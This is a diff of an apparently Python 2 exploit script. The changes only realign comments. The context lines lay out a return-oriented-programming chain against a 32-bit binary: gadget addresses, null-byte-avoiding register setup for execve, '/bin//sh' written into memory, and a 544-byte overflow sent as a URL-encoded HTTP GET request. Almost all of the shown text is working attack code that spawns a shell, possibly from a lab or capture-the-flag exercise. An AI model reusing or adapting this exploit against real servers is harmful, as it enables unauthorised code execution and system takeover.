@@ -202,9 +202,9 @@ def p(x):
 xor_edx = 0x08098280	# xor edx, edx ; div esi ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
 xor_eax = 0x0804a3c3	# xor eax, eax ; ret
 mov_ecx = 0x0805e319	# mov ecx, edx ; rep stosb byte ptr es:[edi], al ; mov eax, dword ptr [esp + 8] ; pop edi ; ret
-pop_edx = 0x0807662a    # pop edx; ret
-pop_eax = 0x080bc865    # pop eax; ret
-sub_eax = 0x080562dc    # sub eax,edx; ret
+pop_edx = 0x0807662a  # pop edx; ret
+pop_eax = 0x080bc865  # pop eax; ret
+sub_eax = 0x080562dc  # sub eax,edx; ret
 mov_mem = 0x080562ab 	# mov dword ptr [edx], eax ; ret
 mov_edx = 0x08055b85	# mov edx, 0xffffffff ; ret
 inc_edx = 0x0805eca7	# inc edx ; ret
@@ -212,9 +212,9 @@ int_80  = 0x0804e9f5	# int 0x80
 
 # Values
 execve_num1 = 0x4141411b
-execve_num2 = 0x41414110	# (execve_num1 - execve_num2) = 0xb; avoiding null bytes
-write_1 = 0x080f1010		# used for writing "/bin" to .bss start address
-write_2 = 0x080f1014		# used for writing "//sh" to .bss start + 4
+execve_num2 = 0x41414110  # (execve_num1 - execve_num2) = 0xb; avoiding null bytes
+write_1 = 0x080f1010      # used for writing "/bin" to .bss start address
+write_2 = 0x080f1014      # used for writing "//sh" to .bss start + 4
 
 # ROP Chain
 payload = "A"*544		    # fill the buffer
@@ -239,10 +239,10 @@ payload += p(pop_edx)
 payload += p(execve_num2)	# EDX=0x41414110
 payload += p(pop_eax)
 payload += p(execve_num1)	# EAX=0x4141411b
-payload += p(sub_eax)		# EAX = EAX - EDX = 0xb
-payload += p(mov_edx)		# EDX=0xffffffff
-payload += p(inc_edx)		# INC EDX -> EDX = 0
-payload += p(int_80)		#call execve()
+payload += p(sub_eax)     # EAX = EAX - EDX = 0xb
+payload += p(mov_edx)     # EDX=0xffffffff
+payload += p(inc_edx)     # INC EDX -> EDX = 0
+payload += p(int_80)      #call execve()
 
 
 print "GET /" + urllib.quote_plus(payload) + "\r\n"
